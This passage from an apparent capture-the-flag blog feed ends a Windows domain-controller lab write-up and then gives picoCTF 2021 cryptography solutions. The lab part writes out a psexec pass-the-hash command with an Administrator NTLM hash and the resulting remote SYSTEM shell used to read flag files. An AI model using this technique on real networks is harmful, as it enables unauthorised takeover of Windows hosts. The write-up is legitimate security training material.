ZERO-DC$:des-cbc-md5:e6efc7387cbcb070
[*] Cleaning up...
</code></pre>
<p>Once we have the admin hash, we get a command prompt with psexec:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990  -no-pass zero/Administrator@172.31.1.29
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.31.1.29.....
[*] Found writable share ADMIN$
[*] Uploading file jdsjoNvH.exe
[*] Opening SVCManager on 172.31.1.29.....
[*] Creating service BdVb on 172.31.1.29.....
[*] Starting service BdVb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;
</code></pre>
<h1 id="fetch-flags-as-administrator">Fetch flags as Administrator</h1>
<pre tabindex="0"><code>C:\Windows\system32&gt;cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 6275-E74A

 Directory of C:\Users\Administrator\Desktop

09/24/2020  11:30 AM    &lt;DIR&gt;          .
09/24/2020  11:30 AM    &lt;DIR&gt;          ..
09/24/2020  11:30 AM                70 System.txt
               1 File(s)             70 bytes
               2 Dir(s)   4,522,897,408 bytes free

C:\Users\Administrator\Desktop&gt;type System.txt

C:\Users\Administrator\Desktop&gt;cd ../..

C:\Users&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 6275-E74A

 Directory of C:\Users

09/24/2020  11:29 AM    &lt;DIR&gt;          .
09/24/2020  11:29 AM    &lt;DIR&gt;          ..
09/24/2020  11:15 AM    &lt;DIR&gt;          Administrator
09/24/2020  11:29 AM    &lt;DIR&gt;          jared
09/24/2020  11:15 AM    &lt;DIR&gt;          Public
               0 File(s)              0 bytes
               5 Dir(s)   4,522,897,408 bytes free

C:\Users&gt;cd jared/Desktop

C:\Users\jared\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 6275-E74A

 Directory of C:\Users\jared\Desktop

09/24/2020  11:29 AM    &lt;DIR&gt;          .
09/24/2020  11:29 AM    &lt;DIR&gt;          ..
09/24/2020  11:30 AM                70 Access.txt
               1 File(s)             70 bytes
               2 Dir(s)   4,522,897,408 bytes free

C:\Users\jared\Desktop&gt;type Access.txt
</code></pre>]]></content></item><item><title>picoCTF 2021 - Cryptography</title><link>https://0xade1.github.io/posts/2021/08/picoctf-2021-cryptography/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://0xade1.github.io/posts/2021/08/picoctf-2021-cryptography/</guid><description>Obediant Cat 1 curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag Mod 26 1 echo &amp;#34;cvpbPGS{arkg_gvzr_V&amp;#39;yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}&amp;#34; | tr &amp;#39;[n-za-m]&amp;#39; &amp;#39;[a-z]&amp;#39; | tr &amp;#39;[N-ZA-M]&amp;#39; &amp;#39;[A-Z]&amp;#39; Python Wrangling 1 cat pw.txt | python3 ende.py -d flag.txt.en Wave a flag 1 strings warm| grep -i pico information 1 exiftool cat.jpg | grep License | awk &amp;#39;{print $3}&amp;#39; | base64 -d Nice netcat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 &amp;gt;&amp;gt;&amp;gt; import pwn &amp;gt;&amp;gt;&amp;gt; host, port = &amp;#39;mercury.</description><content type="html"><![CDATA[<h2 id="obediant-cat">Obediant Cat</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag
</code></pre></td></tr></table>
</div>
</div><h2 id="mod-26">Mod 26</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;cvpbPGS{arkg_gvzr_V&#39;yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}&#34;</span> | tr <span style="color:#f1fa8c">&#39;[n-za-m]&#39;</span> <span style="color:#f1fa8c">&#39;[a-z]&#39;</span> | tr <span style="color:#f1fa8c">&#39;[N-ZA-M]&#39;</span> <span style="color:#f1fa8c">&#39;[A-Z]&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="python-wrangling">Python Wrangling</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat pw.txt | python3 ende.py -d flag.txt.en
</code></pre></td></tr></table>
</div>
</div><h2 id="wave-a-flag">Wave a flag</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings warm| grep -i pico
</code></pre></td></tr></table>
</div>
</div><h2 id="information">information</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool cat.jpg | grep License | awk <span style="color:#f1fa8c">&#39;{print $3}&#39;</span> | base64 -d
</code></pre></td></tr></table>
</div>
</div><h2 id="nice-netcat">Nice netcat</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> pwn
<span style="color:#ff79c6">&gt;&gt;&gt;</span> host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mercury.picoctf.net&#39;</span>, <span style="color:#bd93f9">21135</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt
<span style="color:#f1fa8c">&#39;112 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">105 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">111 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">67 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">84 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">70 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">123 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">103 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">110 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">51 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">53 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">52 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">125 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">10 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
[<span style="color:#f1fa8c">&#39;112&#39;</span>, <span style="color:#f1fa8c">&#39;105&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;111&#39;</span>, <span style="color:#f1fa8c">&#39;67&#39;</span>, <span style="color:#f1fa8c">&#39;84&#39;</span>, <span style="color:#f1fa8c">&#39;70&#39;</span>, <span style="color:#f1fa8c">&#39;123&#39;</span>, <span style="color:#f1fa8c">&#39;103&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;110&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;51&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;53&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;52&#39;</span>, <span style="color:#f1fa8c">&#39;125&#39;</span>, <span style="color:#f1fa8c">&#39;10&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#bd93f9">112</span>)
<span style="color:#f1fa8c">&#39;p&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> decimal <span style="color:#ff79c6">import</span> Decimal
<span style="color:#ff79c6">&gt;&gt;&gt;</span> result <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> result
[<span style="color:#bd93f9">112.0</span>, <span style="color:#bd93f9">105.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">111.0</span>, <span style="color:#bd93f9">67.0</span>, <span style="color:#bd93f9">84.0</span>, <span style="color:#bd93f9">70.0</span>, <span style="color:#bd93f9">123.0</span>, <span style="color:#bd93f9">103.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">110.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">51.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">53.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">52.0</span>, <span style="color:#bd93f9">125.0</span>, <span style="color:#bd93f9">10.0</span>]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(x)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters
[<span style="color:#f1fa8c">&#39;p&#39;</span>, <span style="color:#f1fa8c">&#39;i&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;o&#39;</span>, <span style="color:#f1fa8c">&#39;C&#39;</span>, <span style="color:#f1fa8c">&#39;T&#39;</span>, <span style="color:#f1fa8c">&#39;F&#39;</span>, <span style="color:#f1fa8c">&#39;{&#39;</span>, <span style="color:#f1fa8c">&#39;g&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;n&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;3&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;5&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;4&#39;</span>, <span style="color:#f1fa8c">&#39;}&#39;</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>]
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(characters)
<span style="color:#f1fa8c">&#39;picoCTF{g00d_k1tty!_n1c3_k1tty!_afd5fda4}</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="transformation">Transformation</h2>
<p>Auditing the provided piece of code (below), we can reverse engineer and identify some form of custom encoding:</p>
<ul>
<li>
<p>The encoding works two bytes at a time because of <code>range(.., 2)</code>. So we have to read 16bits at a time.</p>
</li>
<li>
<p>Every two bytes, each byte are converted in integer value with <code>ord</code></p>
</li>
<li>
<p>First byte is multiplied by 256 with <code>&lt;&lt; 8</code> operation, then second byte is added to the result</p>
<p>&lsquo;'.join([chr((ord(flag[i]) &laquo; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])</p>
</li>
</ul>
<p>This is a typical packing transformation which is totally reversible. To unpack:</p>
<ul>
<li>First byte can be retrieved by dividing by 256</li>
<li>Second byte is simply the rest of the division by 256</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/python3</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpack</span>(encoded_flag):
    flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
    <span style="color:#ff79c6">for</span> packed_char <span style="color:#ff79c6">in</span> encoded_flag:
        start_int <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char) <span style="color:#6272a4">#get the integer value of the packed unicode character</span>
        highChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">&gt;&gt;</span><span style="color:#bd93f9">8</span>  <span style="color:#6272a4">#bit shift the integer 8 bits to the right, which in essence divides by 256</span>
        flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(highChar)
        lowChar <span style="color:#ff79c6">=</span> start_int <span style="color:#ff79c6">-</span> (highChar<span style="color:#ff79c6">&lt;&lt;</span><span style="color:#bd93f9">8</span>) <span style="color:#6272a4">#difference between sum of 2 packed characters, and the first character multiplied by 256 or &lt;&lt;8</span>
        lowChar <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(packed_char)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">256</span> <span style="color:#6272a4">#or you could simply use the modulus operator to get the remainder, which will be the lower char</span>
        <span style="color:#6272a4"># explanation for retrieving lowChar.  If you multiple a number by 256</span>
        <span style="color:#6272a4"># and then add another number that is less than 256,</span>
        <span style="color:#6272a4"># the number added will always be the remainder when dividing the</span>
        <span style="color:#6272a4"># sum of those two numbers by 256.</span>
